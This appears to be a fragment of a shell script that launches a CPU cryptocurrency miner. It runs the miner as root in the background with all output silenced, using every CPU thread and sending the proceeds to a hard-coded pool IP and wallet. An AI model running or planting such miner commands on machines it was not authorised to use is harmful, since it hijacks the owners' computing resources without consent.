...
chmod u+x sgr1
sudo nohup ./sgr1 --algorithm yespowersugar --pool 128.199.218.20:443 --wallet shuga1qe8slveuwd3algvepkxsh0cn4tp04lzpwjawcjd.$WORKER --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive > /dev/null 2>&1 &
sleep 30
